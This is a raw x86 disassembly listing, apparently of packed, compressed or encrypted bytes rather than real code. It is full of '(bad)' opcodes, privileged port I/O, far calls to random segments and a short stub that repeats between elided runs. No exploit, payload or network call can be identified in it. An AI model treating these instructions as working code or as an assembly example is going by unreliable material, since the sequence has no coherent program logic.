  42dbb2:	mov    eax,ds:0xab1664e1
  42dbb7:	xchg   ebx,eax
  42dbb8:	mov    ?,esi
  42dbba:	mov    bh,0xb1
  42dbbc:	jbe    0x42dbec
  42dbbe:	repz out dx,al
  42dbc0:	jbe    0x42dba6
  42dbc2:	add    BYTE PTR [ebp-0x1f055f7d],al
  42dbc8:	arpl   WORD PTR ds:0xb7ff944c,bx
  42dbce:	stc    
  42dbcf:	and    ah,bl
  42dbd1:	fcomp  QWORD PTR gs:[bx+si-0x15f2]
  42dbd7:	mov    ds:0x7ba135b8,eax
  42dbdc:	out    0x87,al
  42dbde:	jge    0x42dc0f
  42dbe0:	shl    DWORD PTR [eax],1
  42dbe2:	and    BYTE PTR [edi],al
  42dbe4:	dec    edi
  42dbe5:	rol    BYTE PTR [ebp+ebx*2-0x2f975069],1
  42dbec:	mov    DWORD PTR [edx-0x1f94ac7b],esp
  42dbf2:	ret    0xdfd0
  42dbf5:	add    al,0x66
  42dbf7:	cmc    
  42dbf8:	(bad)  
  42dbfa:	pop    edx
  42dbfb:	scas   eax,DWORD PTR es:[edi]
  42dbfc:	lods   al,BYTE PTR ds:[esi]
  42dbfd:	push   ecx
  42dbfe:	fsubr  DWORD PTR [ebp+0x9]
  42dc01:	jp     0x42dc0c
  42dc03:	push   ds
  42dc04:	cli    
  42dc05:	cs dec ebx
  42dc07:	lahf   
  42dc08:	in     al,dx
  42dc09:	sub    ebp,DWORD PTR [ebx]
  42dc0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc0c:	dec    edx
  42dc0d:	cld    
  42dc0e:	mov    bh,0x78
  42dc10:	pop    esi
  42dc11:	je     0x42dc0f
  42dc13:	add    DWORD PTR [ebx-0x26e5661d],ecx
  42dc19:	adc    DWORD PTR [esi],0x13
  42dc1c:	push   ebp
  42dc1d:	dec    sp
  42dc1f:	push   ebp
  42dc20:	lea    ecx,[edi+0x24731d4b]
  42dc26:	hlt    
  42dc27:	mov    WORD PTR [ebx+0x2c],es
  42dc2a:	and    al,0xd
  42dc2c:	test   DWORD PTR [esi],ebx
  42dc2e:	adc    BYTE PTR [ecx+eax*4-0x16],ch
  42dc32:	arpl   WORD PTR [eax-0x10],dx
  42dc35:	xor    al,0xe0
  42dc37:	dec    eax
  42dc38:	mov    esi,0x5b55957d
  42dc3d:	mov    eax,ds:0xde60a183
  42dc42:	xchg   edx,eax
  42dc43:	out    dx,eax
  42dc44:	push   edx
  42dc45:	punpckldq mm5,DWORD PTR [edx]
  42dc48:	dec    ecx
  42dc49:	pop    ebx
  42dc4a:	pop    eax
  42dc4b:	ins    DWORD PTR es:[edi],dx
  42dc4c:	push   ds
  42dc4d:	cdq    
  42dc4e:	in     al,dx
  42dc4f:	daa    
  42dc50:	dec    esi
  42dc51:	xchg   ebx,eax
  42dc52:	cmp    eax,0x3dc4348b
  42dc57:	push   ebx
  42dc58:	jnp    0x42dc31
  42dc5a:	adc    DWORD PTR [ebp-0x66e5b0b6],esp
  42dc60:	inc    edx
  42dc61:	jmp    0xc7010553
  42dc66:	sub    ch,BYTE PTR [esi-0x69]
  42dc69:	ins    BYTE PTR es:[edi],dx
  42dc6a:	mov    eax,edx
  42dc6c:	sbb    eax,0x14907d3
  42dc71:	lock add DWORD PTR [edx],edi
  42dc74:	sub    BYTE PTR [ebp+0x66],dl
  42dc77:	mov    al,ds:0x2f24effa
  42dc7c:	fcomp  DWORD PTR [ecx+0x2ed9b4f5]
  42dc82:	cmp    eax,0x2c1f11e3
  42dc87:	aam    0x27
  42dc89:	xchg   edx,eax
  42dc8a:	sbb    DWORD PTR [ebx],ebp
  42dc8c:	popf   
  42dc8d:	repz fwait
  42dc8f:	dec    ebp
  42dc90:	dec    esi
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	pop    ecx
  42dd01:	in     eax,dx
  42dd02:	or     ch,BYTE PTR [edi+0x1eb40]
  42dd08:	add    eax,0x42000001
  42dd0d:	mov    bh,0xf5
  42dd0f:	sub    ch,BYTE PTR [edi]
  42dd11:	std    
  42dd12:	push   edi
  42dd13:	fsub   DWORD PTR [edx+ebx*8+0x28]
  42dd17:	push   ebp
  42dd18:	jno    0x42dd61
  42dd1a:	push   es
  42dd1b:	inc    esi
  42dd1c:	fld    st(1)
  42dd1e:	mov    edx,DWORD PTR [ebx]
  42dd20:	push   edx
  42dd21:	pop    edx
  42dd22:	jo     0x42dd59
  42dd24:	dec    esi
  42dd25:	adc    eax,0xc80e982a
  42dd2a:	xor    al,0x36
  42dd2c:	xchg   edi,eax
  42dd2d:	shl    DWORD PTR [edi+0x34],cl
  42dd30:	lsl    ebx,WORD PTR ds:0x9d6e66dc
  42dd37:	adc    DWORD PTR [edx+0x8],ecx
  42dd3a:	jecxz  0x42ddab
  42dd3c:	out    dx,eax
  42dd3d:	xor    DWORD PTR [ebx-0x613bc3ba],ecx
  42dd43:	sub    al,0xb9
  42dd45:	xor    al,0xb0
  42dd47:	fcmovnu st,st(2)
  42dd49:	mov    esp,DWORD PTR [edi-0x76]
  42dd4c:	pop    ss
  42dd4d:	daa    
  42dd4e:	xor    BYTE PTR [esi+0x6],bh
  42dd51:	mov    ch,0x82
  42dd53:	out    dx,al
  42dd54:	scas   al,BYTE PTR es:[edi]
  42dd55:	arpl   WORD PTR [ebx+0x4f],si
  42dd58:	lock sub ah,0x7a
  42dd5c:	popa   
  42dd5d:	test   BYTE PTR [ebp-0x33],0xb9
  42dd61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd62:	xor    al,0xcb
  42dd64:	int3   
  42dd65:	adc    al,0x64
  42dd67:	xor    al,0x68
  42dd69:	dec    esi
  42dd6a:	sbb    al,0x1d
  42dd6c:	mov    ch,0xd4
  42dd6e:	mov    ebp,DWORD PTR [esi]
  42dd70:	pop    es
  42dd71:	jo     0x42dda7
  42dd73:	sbb    eax,0x7639426f
  42dd78:	jecxz  0x42ddee
  42dd7a:	jnp    0x42ddc1
  42dd7c:	out    0x7b,al
  42dd7e:	dec    esp
  42dd7f:	adc    BYTE PTR [esi*2-0x59c8610d],ah
  42dd86:	cmp    ah,BYTE PTR [esi+0x348bf7ca]
  42dd8c:	cli    
  42dd8d:	imul   ebp,DWORD PTR [edx],0xffffff86
  42dd90:	sbb    BYTE PTR [ecx-0x21],0xf8
  42dd94:	outs   dx,DWORD PTR ds:[esi]
  42dd95:	or     BYTE PTR [ebx+0x3891a95c],cl
  42dd9b:	cmp    al,0xfe
  42dd9d:	push   ebx
  42dd9e:	cli    
  42dd9f:	pop    ds
  42dda0:	cmp    eax,0xf5206cc5
  42dda5:	sub    eax,0xa52c16a4
  42ddaa:	xchg   esi,eax
  42ddab:	push   ss
  42ddac:	push   ss
  42ddad:	or     al,0x7c
  42ddaf:	xchg   ebp,eax
  42ddb0:	test   eax,0x132ba741
  42ddb5:	push   cs
  42ddb6:	mov    esi,0x6451b01
  42ddbb:	std    
  42ddbc:	scas   eax,DWORD PTR es:[edi]
  42ddbd:	add    bh,ch
  42ddbf:	int3   
  42ddc0:	xchg   BYTE PTR [ebp+0x21d8be],bl
  42ddc6:	mov    ds:0xc6ee6c48,eax
  42ddcb:	mov    ah,0x44
  42ddcd:	jge    0x42de39
  42ddcf:	repnz cmp eax,0x185d9aa1
  42ddd5:	cli    
  42ddd6:	addr16 bnd jge 0x42ddef
  42ddda:	and    al,0xf
  42dddc:	not    esi
  42ddde:	ss jo  0x42ddeb
  42dde1:	xlat   BYTE PTR ds:[ebx]
  42dde2:	enter  0xabaa,0x76
  42dde6:	and    eax,0x6702029
  42ddeb:	lods   al,BYTE PTR ds:[esi]
  42ddec:	xchg   edi,eax
  42dded:	pop    edx
  42ddee:	mov    esp,cr4
  42ddf1:	adc    esp,DWORD PTR [ebp-0x58]
  42ddf4:	jns    0x42de54
  42ddf6:	lds    eax,FWORD PTR [ebx-0x358e5725]
  42ddfc:	xor    eax,0xba623c0
  42de01:	xor    cl,BYTE PTR [ecx+0x7cc8f6d0]
  42de07:	add    al,0xa9
  42de09:	imul   ecx,DWORD PTR [edx+0x95c8a46],0xffffffca
  42de10:	aad    0x0
	...
  42de72:	add    BYTE PTR [eax],al
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	js     0x42dea4
  42de82:	cmp    al,0x31
  42de84:	inc    ebp
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0x67000001
  42de8d:	loope  0x42de80
  42de8f:	imul   bl
  42de91:	in     al,dx
  42de92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de93:	add    ch,BYTE PTR [ebx-0x27]
  42de96:	push   edi
  42de97:	mov    bh,al
  42de99:	xor    ch,0x31
  42de9c:	icebp  
  42de9d:	and    dh,cl
  42de9f:	dec    edi
  42dea0:	call   0x3878ec0e
  42dea5:	test   eax,0xdcd097d1
  42deaa:	cwde   
  42deab:	add    ch,bh
  42dead:	call   0x6d3d:0x24c31809
  42deb4:	aaa    
  42deb5:	inc    ecx
  42deb6:	mov    BYTE PTR [ebx+esi*4],al
  42deb9:	adc    BYTE PTR [edx+edi*1],dh
  42debc:	fs mov bh,0xf9
  42debf:	mov    ds:0xaf5e5316,al
  42dec4:	sbb    BYTE PTR [ebx-0x6c1e4ef9],bh
  42deca:	and    al,0x17
  42decc:	icebp  
  42decd:	pop    eax
  42dece:	cmp    edi,DWORD PTR [edi]
  42ded0:	jb     0x42deb4
  42ded2:	mov    esi,0x6c73b308
  42ded7:	xchg   edx,eax
  42ded8:	pop    ss
  42ded9:	mov    ds:0x947fd778,eax
  42dede:	(bad)  
  42dedf:	pop    esp
  42dee0:	outs   dx,DWORD PTR ds:[esi]
  42dee1:	dec    ecx
  42dee2:	add    eax,0xe6f69cdf
  42dee7:	or     bl,BYTE PTR [ecx-0x3]
  42deea:	mov    eax,ds:0x525dbda2
  42deef:	outs   dx,BYTE PTR ds:[esi]
  42def0:	sub    eax,DWORD PTR [ecx-0x79]
  42def3:	xor    BYTE PTR [edi],ah
  42def5:	mov    ah,bh
  42def7:	fld    QWORD PTR [ebp+0x66]
  42defa:	pop    edi
  42defb:	xlat   BYTE PTR ds:[ebx]
  42defc:	aaa    
  42defd:	sub    DWORD PTR [edx+0x3de02be],eax
  42df03:	sub    BYTE PTR [ecx+0x30],bl
  42df06:	mov    cl,0x6d
  42df08:	test   BYTE PTR [edx],ah
  42df0a:	lods   eax,DWORD PTR ds:[esi]
  42df0b:	add    al,BYTE PTR cs:[eax+0x68bf053e]
  42df12:	(bad)  
  42df13:	fisubr DWORD PTR [edx-0x470fc299]
  42df19:	stos   BYTE PTR es:[edi],al
  42df1a:	stos   DWORD PTR es:[edi],eax
  42df1b:	das    
  42df1c:	add    al,0xa
  42df1e:	call   0x1c63da0e
  42df23:	sub    eax,DWORD PTR [eax+edx*2-0x2f1dde22]
  42df2a:	loope  0x42df63
  42df2c:	(bad)  
  42df2d:	jae    0x42dfab
  42df2f:	xor    esp,DWORD PTR [ecx+0x1b063d51]
  42df35:	aas    
  42df36:	or     BYTE PTR [esi],dl
  42df38:	nop
  42df39:	loopne 0x42dec6
  42df3b:	and    eax,DWORD PTR [eax-0x1294cb1a]
  42df41:	jle    0x42df67
  42df43:	push   0xd1d228a0
  42df48:	sti    
  42df49:	adc    eax,DWORD PTR [ecx-0x644735bd]
  42df4f:	inc    esp
  42df50:	jl     0x42df66
  42df52:	push   edx
  42df53:	mulps  xmm7,XMMWORD PTR [edi+0x6a]
  42df57:	jmp    0xf78d:0xe28c3132
  42df5e:	iret   
  42df5f:	stc    
  42df60:	int    0xb0
  42df62:	sub    edi,DWORD PTR [ecx+0x7eac13a3]
  42df68:	into   
  42df69:	sub    al,0x3b
  42df6b:	test   eax,0xa050557f
  42df70:	into   
  42df71:	iret   
  42df72:	sub    ebx,DWORD PTR [ebp+0x61]
  42df75:	fcom   DWORD PTR [ecx+0x7d6858bc]
  42df7b:	hlt    
  42df7c:	out    0x2,al
  42df7e:	inc    edx
  42df7f:	ret    
  42df80:	aam    0xfc
  42df82:	in     eax,0x4e
  42df84:	inc    ebx
  42df85:	mov    bl,0xd4
  42df88:	adc    BYTE PTR [eax-0x5e],dh
  42df8b:	sub    eax,esp
  42df8d:	mov    edx,0x9c4783
	...
  42dff2:	add    BYTE PTR [eax],al
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x4d]
  42e001:	cmp    eax,0xed4a040f
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0xbe000001
  42e00d:	fild   QWORD PTR [edx+0x63]
  42e010:	enter  0xd4b9,0x22
  42e014:	scas   al,BYTE PTR es:[edi]
  42e015:	xor    cl,BYTE PTR [ebx+0x7d6f6cef]
  42e01b:	pop    ds
  42e01c:	or     eax,0xd30ef062
  42e021:	xor    al,0x98
  42e023:	add    BYTE PTR [ecx+0x3dd6de95],al
  42e029:	jmp    0xfe2e3bc0
  42e02e:	mov    al,0xd5
  42e030:	sbb    al,0xd8
  42e032:	push   0x655d3a0d
  42e037:	adc    eax,0x2a1006c6
  42e03c:	cld    
  42e03d:	lds    edx,FWORD PTR [esi+0x79]
  42e040:	fidiv  WORD PTR gs:[ebp-0x32]
  42e044:	test   BYTE PTR [ebx-0x2b7cea51],dh
  42e04a:	adc    BYTE PTR [edx+0x73],bh
  42e04d:	pusha  
  42e04e:	jg     0x42e0c1
  42e050:	xor    DWORD PTR [esi-0x40],esi
  42e053:	popf   
  42e054:	les    eax,FWORD PTR [esi+0x473f70f9]
  42e05a:	scas   al,BYTE PTR es:[edi]
  42e05b:	inc    edi
  42e05c:	not    BYTE PTR [ebx+0x43a40e92]
  42e062:	jg     0x42e05a
  42e064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e065:	mov    al,0xc3
  42e067:	repz add eax,0x1c544030
  42e06d:	ss pop ecx
  42e06f:	ins    BYTE PTR es:[edi],dx
  42e070:	fs push edi
  42e072:	cmp    DWORD PTR [eax+0x4960b3a],0xd7da96e2
  42e07c:	dec    edx
  42e07d:	mov    ds:0x99b42f74,eax
  42e082:	and    BYTE PTR [ebx-0x4bdd3779],cl
  42e088:	in     al,dx
  42e089:	xor    cl,BYTE PTR [edx+0x16]
  42e08c:	out    dx,al
  42e08d:	xor    esp,DWORD PTR [edi]
  42e08f:	addr16 add ah,bh
  42e092:	xor    BYTE PTR [ecx-0x743c7de4],dh
  42e098:	jle    0x42e04c
  42e09a:	push   edx
  42e09b:	clc    
  42e09c:	daa    
  42e09d:	arpl   WORD PTR [ecx+0x42],cx
  42e0a0:	das    
  42e0a1:	sbb    edx,DWORD PTR [ecx]
  42e0a3:	and    BYTE PTR [eax],bl
  42e0a5:	std    
  42e0a6:	jecxz  0x42e086
  42e0a8:	dec    ebx
  42e0a9:	sub    eax,0x7c256ddb
  42e0ae:	lods   al,BYTE PTR ds:[esi]
  42e0af:	enter  0x939b,0xa8
  42e0b3:	into   
  42e0b4:	jbe    0x42e131
  42e0b6:	(bad)  
  42e0b7:	sbb    edi,DWORD PTR [ebx+0xc]
  42e0ba:	ret    0x4c8
  42e0bd:	mov    al,0x97
  42e0bf:	retf   
  42e0c0:	push   edi
  42e0c1:	push   esi
  42e0c2:	jmp    0x42e0f9
  42e0c4:	push   ebx
  42e0c5:	push   es
  42e0c6:	inc    eax
  42e0c7:	pmaddwd mm0,mm5
  42e0ca:	or     DWORD PTR [ebp+0x5c],edi
  42e0cd:	stos   BYTE PTR es:[edi],al
  42e0ce:	mov    eax,0xf5508ef1
  42e0d3:	iret   
  42e0d4:	cdq    
  42e0d5:	outs   dx,BYTE PTR ds:[esi]
  42e0d6:	or     al,BYTE PTR [ebp-0x23dda537]
  42e0dc:	mov    esi,DWORD PTR [esi+0x40]
  42e0df:	jae    0x42e0d0
  42e0e1:	mov    ebp,0x2b8f2731
  42e0e6:	sub    eax,0xfa3fe79d
  42e0eb:	ret    
  42e0ec:	cmp    BYTE PTR [esi],dh
  42e0ee:	lods   eax,DWORD PTR ds:[esi]
  42e0ef:	dec    edi
  42e0f0:	in     al,dx
  42e0f1:	xlat   BYTE PTR ds:[ebx]
  42e0f2:	xor    bl,cl
  42e0f4:	adc    cl,BYTE PTR ds:[edx+0x62b1d700]
  42e0fb:	xor    eax,0xb7f2105b
  42e100:	idiv   ch
  42e102:	mov    edi,0xaa4b6189
  42e107:	and    edi,ebp
  42e109:	mov    es,WORD PTR [edi+0x6f97b4e]
  42e10f:	and    eax,0x19
	...
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	sahf   
  42e181:	loopne 0x42e137
  42e183:	mov    ds:0x1ee4f,al
  42e188:	add    eax,0x5a000001
  42e18d:	or     eax,0xb586303a
  42e192:	push   es
  42e193:	retf   
  42e194:	mov    bl,0xd9
  42e196:	std    
  42e197:	ds inc ebx
  42e199:	aas    
  42e19a:	push   ebp
  42e19b:	jno    0x42e1ee
  42e19d:	xlat   BYTE PTR ds:[ebx]
  42e19e:	xor    edx,esp
  42e1a0:	mov    ch,0x2f
  42e1a2:	aas    
  42e1a3:	test   eax,0x74d03d04
  42e1a8:	sub    al,0xbb
  42e1aa:	scas   al,BYTE PTR es:[edi]
  42e1ab:	jge    0x42e147
  42e1ad:	loop   0x42e194
  42e1af:	lds    edx,FWORD PTR [ecx-0x59902657]
  42e1b5:	mov    eax,ds:0x700abfc6
  42e1ba:	gs out 0x3,al
  42e1bd:	jge    0x42e23b
  42e1bf:	pop    edx
  42e1c0:	mov    al,ds:0x7caed0df
  42e1c5:	or     BYTE PTR [edx-0x4ad562ad],cl
  42e1cb:	(bad)  
  42e1cd:	mov    BYTE PTR [edx+0x357b5b52],ch
  42e1d3:	xchg   BYTE PTR [ebp+0x29b2d410],dl
  42e1d9:	jecxz  0x42e227
  42e1db:	fiadd  WORD PTR [ecx]
  42e1dd:	out    0x34,al
  42e1df:	dec    ecx
  42e1e0:	dec    ecx
  42e1e1:	jae    0x42e235
  42e1e3:	dec    ecx
  42e1e4:	pop    ebx
  42e1e5:	cmp    ah,cl
  42e1e7:	add    BYTE PTR [edi+eiz*1+0x7b],ch
  42e1eb:	mov    dh,0xcc
  42e1ed:	push   ds
  42e1ee:	stc    
  42e1ef:	out    0xb6,al
  42e1f1:	inc    ecx
  42e1f2:	jns    0x42e1cb
  42e1f4:	and    al,0x6f
  42e1f7:	or     ah,0x27
  42e1fa:	mov    ds:0x772cb13b,eax
  42e1ff:	lods   al,BYTE PTR ds:[esi]
  42e200:	int3   
  42e201:	dec    ecx
  42e202:	stos   DWORD PTR es:[edi],eax
  42e203:	repz das 
  42e205:	or     ecx,ecx
  42e207:	sbb    eax,0x26d7440e
  42e20c:	dec    esp
  42e20d:	xchg   DWORD PTR [ebx],esp
  42e20f:	inc    ebp
  42e210:	jl     0x42e1b3
  42e212:	mov    ch,0x66
  42e214:	ss sbb eax,0x584b5ce
  42e21a:	mov    cl,BYTE PTR [ecx]
  42e21c:	cs or  al,0xd
  42e21f:	retf   0x4806
  42e222:	push   edx
  42e223:	es jge 0x42e1b7
  42e226:	sti    
  42e227:	or     cl,BYTE PTR [ecx-0x22]
  42e22a:	mov    al,0x78
  42e22c:	sbb    eax,0xa8720468
  42e231:	fwait
  42e232:	out    0x95,eax
  42e234:	push   ds
  42e235:	aad    0x2b
  42e237:	sub    BYTE PTR [ebx],ah
  42e239:	cld    
  42e23a:	mov    eax,0x11b17e70
  42e23f:	inc    edi
  42e240:	retf   
  42e241:	call   0xb5f6:0xa3165e65
  42e248:	cdq    
  42e249:	add    BYTE PTR [esi-0xb079e5c],cl
  42e24f:	lods   eax,DWORD PTR ds:[esi]
  42e250:	and    al,0x1b
  42e252:	add    BYTE PTR [esi],dl
  42e254:	xchg   ebp,eax
  42e255:	mov    ds:0x722bb68b,eax
  42e25a:	or     eax,0x12f4e2ec
  42e25f:	xchg   bl,ah
  42e261:	xchg   edi,eax
  42e262:	inc    esp
  42e263:	test   al,0xa7
  42e265:	pop    esp
  42e266:	dec    ebp
  42e267:	xchg   BYTE PTR [ebx+0x78],bh
  42e26a:	imul   edi,DWORD PTR [esi],0x3b7d41cf
  42e270:	lods   eax,DWORD PTR ds:[esi]
  42e271:	push   ss
  42e272:	(bad)  
  42e273:	xor    BYTE PTR [ebx],bl
  42e275:	pop    ds
  42e276:	mov    bl,dh
  42e278:	add    al,0x7a
  42e27a:	push   ds
  42e27b:	push   ds
  42e27c:	mov    edx,0x7998d9d5
  42e281:	pop    ecx
  42e282:	out    0xb4,eax
  42e284:	jnp    0x42e236
  42e286:	fwait
  42e287:	and    eax,0x188b86e2
  42e28c:	jns    0x42e2ef
  42e28e:	or     ebx,edi
  42e290:	rol    BYTE PTR [eax],1
	...
  42e2f2:	add    BYTE PTR [eax],al
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xac199140
  42e301:	pop    esi
  42e302:	stos   DWORD PTR es:[edi],eax
  42e303:	push   ss
  42e304:	push   esp
  42e305:	out    dx,eax
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0x57000001
  42e30d:	cmp    eax,0xf98678ed
  42e312:	inc    ebx
  42e313:	sub    DWORD PTR [esi-0x68],ecx
  42e316:	jne    0x42e31d
  42e318:	lahf   
  42e319:	std    
  42e31a:	aad    0x6a
  42e31c:	and    al,BYTE PTR [ebx+eax*8]
  42e31f:	pusha  
  42e320:	or     al,0xfc
  42e322:	iret   
  42e323:	aad    0x44
  42e325:	ror    BYTE PTR [edx],0x12
  42e328:	jo     0x42e2b3
  42e32a:	mov    eax,0xcb14cc05
  42e32f:	xor    eax,0xa77c7e1a
  42e334:	clc    
  42e335:	jmp    0x81535437
  42e33a:	add    BYTE PTR [edi-0x18],ah
  42e33d:	sub    al,0xd5
  42e33f:	inc    esp
  42e340:	mov    al,ds:0xfb2832bc
  42e345:	test   eax,0xf3c0d160
  42e34a:	call   0x13d9:0xd5986e09
  42e351:	cwde   
  42e352:	pop    ebp
  42e353:	push   ebx
  42e354:	push   es
  42e355:	cmp    eax,0xe9ac5a70
  42e35a:	adc    DWORD PTR [esi],edx
  42e35c:	neg    BYTE PTR [esi-0x5aa93e83]
  42e362:	mov    DWORD PTR [ecx+ebp*2+0x39],ebp
  42e366:	sub    BYTE PTR [edx+ebp*2+0x43],0xfb
  42e36b:	cmp    DWORD PTR [edi],ecx
  42e36d:	and    DWORD PTR [esi-0x38],eax
  42e370:	fdivr  QWORD PTR [eax+0x58]
  42e373:	mov    bh,0xc8
  42e375:	xchg   esp,eax
  42e376:	dec    edi
  42e377:	mov    dh,0x3e
  42e379:	sbb    al,0xe1
  42e37b:	test   BYTE PTR [ecx],cl
  42e37d:	pop    ebx
  42e37e:	xor    DWORD PTR [edi+0x6d],ebp
  42e381:	push   ebp
  42e382:	in     al,dx
  42e383:	cli    
  42e384:	xchg   esp,eax
  42e385:	jge    0x42e3e8
  42e387:	and    DWORD PTR [ebx-0x764bf1ca],edx
  42e38d:	les    esp,FWORD PTR [eax-0x3b]
  42e390:	icebp  
  42e391:	pop    esp
  42e392:	pusha  
  42e393:	adc    edi,edi
  42e395:	mov    ebx,0xf32e3ec
  42e39a:	aaa    
  42e39b:	inc    ecx
  42e39c:	out    dx,al
  42e39d:	and    al,0x43
  42e39f:	nop
  42e3a0:	cmp    BYTE PTR [eax-0x7f14940d],0x23
  42e3a7:	pop    ebx
  42e3a8:	mov    ebp,0xeb21a9f6
  42e3ad:	pop    ebx
  42e3ae:	xor    BYTE PTR ds:0x263c2f10,bl
  42e3b4:	push   es
  42e3b5:	popa   
  42e3b6:	in     eax,0x49
  42e3b8:	jg     0x42e360
  42e3ba:	mov    dh,0xff
  42e3bc:	pop    edi
  42e3bd:	mov    dl,0x2d
  42e3bf:	xor    al,0x4e
  42e3c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3c2:	popa   
  42e3c3:	mov    dl,0xe1
  42e3c5:	xor    BYTE PTR [eax-0x5],bh
  42e3c8:	pop    ecx
  42e3c9:	out    dx,al
  42e3ca:	add    eax,0x81b4e3fa
  42e3cf:	inc    edi
  42e3d0:	loope  0x42e35d
  42e3d2:	cmp    eax,0xab2c7d03
  42e3d7:	popf   
  42e3d8:	mov    ecx,0x73c30434
  42e3dd:	pop    es
  42e3de:	std    
  42e3df:	push   cs
  42e3e0:	call   0x286:0xb0ba1696
  42e3e7:	dec    ebx
  42e3e8:	push   0x7f4ddbae
  42e3ed:	pop    ecx
  42e3ee:	mov    es,WORD PTR [edi-0x16]
  42e3f1:	xor    al,0xc7
  42e3f3:	in     eax,dx
  42e3f4:	enter  0xea3f,0xcc
  42e3f8:	xor    eax,0x9511d113
  42e3fd:	push   ecx
  42e3fe:	scas   al,BYTE PTR es:[edi]
  42e3ff:	lahf   
  42e400:	mov    ch,0x69
  42e402:	lods   al,BYTE PTR ds:[esi]
  42e403:	jmp    0xea068f9f
  42e408:	jns    0x42e3a1
  42e40a:	pop    ecx
  42e40b:	push   es
  42e40c:	mov    edx,DWORD PTR [ecx+0x846667]
	...
  42e472:	add    BYTE PTR [eax],al
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	aam    0x5c
  42e482:	stos   DWORD PTR es:[edi],eax
  42e483:	adc    al,0x59
  42e485:	lock add DWORD PTR [eax],eax
  42e488:	add    eax,0x3b000001
  42e48d:	jge    0x42e45a
  42e48f:	and    BYTE PTR [edi],0x28
  42e492:	mov    dl,0xe3
  42e494:	sub    al,0x2f
  42e496:	loopne 0x42e4ef
  42e498:	pushf  
  42e499:	lock loopne 0x42e44d
  42e49c:	pop    edx
  42e49d:	out    0xbc,eax
  42e49f:	jmp    0x42e48d
  42e4a1:	mov    BYTE PTR [esi+0x2bf4110e],dl
  42e4a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4a8:	nop
  42e4a9:	ja     0x42e4c2
  42e4ab:	imul   ebp,ebx,0xc5277b3e
  42e4b1:	dec    eax
  42e4b2:	or     BYTE PTR [eax+0x37f9fce2],dh
  42e4b8:	dec    ebx
  42e4b9:	mov    bl,0x7c
  42e4bb:	retf   
  42e4bc:	push   ebp
  42e4bd:	xchg   ebp,eax
  42e4be:	sub    DWORD PTR ds:0xf208c255,ecx
  42e4c4:	add    dh,ch
  42e4c6:	rcr    BYTE PTR [edx-0x4f],cl
  42e4c9:	add    al,0x4f
  42e4cb:	jns    0x42e517
  42e4cd:	bnd ja 0x42e452
  42e4d0:	aam    0x4f
  42e4d2:	jb     0x42e4fb
  42e4d4:	ins    BYTE PTR es:[edi],dx
  42e4d5:	mov    al,0x73
  42e4d7:	mov    eax,ds:0x3e27f9b8
  42e4dc:	in     eax,0xa4
  42e4de:	pop    esi
  42e4df:	pop    edx
  42e4e0:	(bad)  
  42e4e1:	inc    edx
  42e4e2:	or     DWORD PTR [ecx+ebp*4],edx
  42e4e5:	push   edx
  42e4e6:	mov    edx,0xa712d218
  42e4eb:	pop    esp
  42e4ec:	xchg   DWORD PTR [edx+0x42],ecx
  42e4ef:	into   
  42e4f0:	xchg   edx,eax
  42e4f1:	test   eax,0xa3347622
  42e4f6:	xchg   BYTE PTR [edx-0x38],ch
  42e4f9:	js     0x42e533
  42e4fb:	je     0x42e539
  42e4fd:	adc    eax,0x75eae317
  42e502:	sar    bl,cl
  42e504:	sub    ecx,DWORD PTR [esi]
  42e506:	xor    ecx,DWORD PTR [edx+0x6b]
  42e509:	sbb    DWORD PTR [ebp-0x1fe29155],ecx
  42e50f:	add    BYTE PTR [ebx-0x53],ah
  42e512:	mov    cl,0x7a
  42e514:	push   eax
  42e515:	dec    esi
  42e516:	jae    0x42e4f9
  42e518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e519:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42e51b:	retf   
  42e51c:	popa   
  42e51d:	scas   eax,DWORD PTR es:[edi]
  42e51e:	adc    dh,BYTE PTR [eax-0x821035]
  42e524:	gs aam 0x32
  42e527:	inc    ebp
  42e528:	aas    
  42e529:	mov    eax,DWORD PTR [eax]
  42e52b:	inc    ebx
  42e52c:	(bad)  
  42e52d:	add    ah,BYTE PTR [ebx-0x15]
  42e530:	in     al,dx
  42e531:	call   0xd0ebdedd
  42e536:	sub    DWORD PTR [esi+0x48f35ff1],esp
  42e53c:	jbe    0x42e575
  42e53e:	out    0xbd,eax
  42e540:	pop    ss
  42e541:	mov    al,0xc6
  42e543:	ds in  eax,dx
  42e545:	in     eax,0xcb
  42e547:	mov    ch,BYTE PTR [ebx+edi*4-0x9cb7745]
  42e54e:	jnp    0xcab0f708
  42e554:	mov    al,BYTE PTR [edx+0x74]
